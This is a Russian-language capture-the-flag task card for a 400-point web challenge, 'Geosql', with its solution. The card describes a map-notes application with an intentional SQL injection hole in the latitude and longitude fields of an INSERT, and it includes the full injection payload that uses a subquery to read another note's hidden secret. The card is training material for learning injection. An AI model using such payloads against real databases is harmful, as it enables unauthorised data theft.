#Категория: Web
##Название:  Geosql
##Сложность:  400 баллов

#Описание:

Сайт представляет собой систему хранения заметок на карте. Пользователь может оставлять заметку на заданной широте и долготе с некоторым текстом и секретом, который становится недоступным для просмотра. Пользователь так же может просматривать заметки на выбранном полигоне. Командам дана информация что секрет хранится в районе Нью-Йорка.
Для вывода и работы с картами используется GoogleMaps (или YandexMaps, реализация есть для обоих сервисов). Используется БД Mysql 5.6 с Spatial Data для поиска в полигонах. 
При сохранении заметки программист совершил ошибку необезопасив вводимые пользователем данные в параметрах широты и долготы. Благодаря этому открывается Mysql injection и благодаря созданию подзапросов появляется возможность достать из Нью-Йоркской заметки секретную информацию.
Основной целью является ознакомление участников с SQL инъекциями сложной структуры.

# Доработки:

ограничить поиск по точке

# Решение: 

=================================== Запрос :
SELECT t.secret 
FROM (SELECT secret, position FROM notes) t 
WHERE 
ST_Contains(
	PolygonFromText('POLYGON((55.997324986637 92.785634994507,55.991180596351 92.785377502441,55.991468636464 92.800569534302,55.998668941822 92.799797058105,55.997324986637 92.785634994507))'), 
	t.position
)

================================== Инъекция :

INSERT INTO `notes`(`position`, `text`, `secret`) VALUES  (GeomFromText('POINT(

======Начало инъекции

56 93)'), (SELECT t.secret   FROM (SELECT secret, position FROM notes) t   WHERE   ST_Contains(   PolygonFromText('POLYGON((55.997324986637 92.785634994507,55.991180596351 92.785377502441,55.991468636464 92.800569534302,55.998668941822 92.799797058105,55.997324986637 92.785634994507))'),    t.position  )), 'secret done');#

======Конец инъекции

$latLng)'),'$text');